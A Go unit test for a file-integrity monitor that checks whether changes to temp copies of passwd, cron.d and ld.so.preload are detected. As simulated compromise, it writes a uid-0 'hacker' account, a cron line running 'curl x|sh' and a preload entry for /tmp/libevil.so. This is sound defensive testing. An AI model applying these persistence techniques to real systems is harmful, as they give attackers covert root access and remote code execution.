package agent

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestFileIntegrity(t *testing.T) {
	dir := t.TempDir()
	passwd := filepath.Join(dir, "passwd")
	cronDir := filepath.Join(dir, "cron.d")
	preload := filepath.Join(dir, "ld.so.preload")
	os.WriteFile(passwd, []byte("root:x:0:0\n"), 0o644)
	os.Mkdir(cronDir, 0o755)
	os.WriteFile(filepath.Join(cronDir, "backup"), []byte("0 3 * * * backup\n"), 0o644)
	patterns := []string{passwd, cronDir, preload}

	base := ScanFiles(patterns)
	if len(base) != 2 {
		t.Fatalf("baseline = %v", base)
	}
	if ev := DiffFiles(base, ScanFiles(patterns), time.Now()); len(ev) != 0 {
		t.Fatalf("no change but got %+v", ev)
	}

	os.WriteFile(passwd, []byte("root:x:0:0\nhacker:x:0:0\n"), 0o644)
	os.WriteFile(filepath.Join(cronDir, "evil"), []byte("* * * * * curl x|sh\n"), 0o644)
	os.Remove(filepath.Join(cronDir, "backup"))
	os.WriteFile(preload, []byte("/tmp/libevil.so\n"), 0o644)

	got := map[string]string{}
	for _, ev := range DiffFiles(base, ScanFiles(patterns), time.Now()) {
		got[filepath.Base(ev.Path)] = ev.Detail
	}
	want := map[string]string{"passwd": "modified", "evil": "created", "backup": "deleted", "ld.so.preload": "created"}
	if len(got) != len(want) {
		t.Fatalf("got %v", got)
	}
	for name, prefix := range want {
		if !strings.HasPrefix(got[name], prefix) {
			t.Errorf("%s: got %q, want %q", name, got[name], prefix)
		}
	}
}
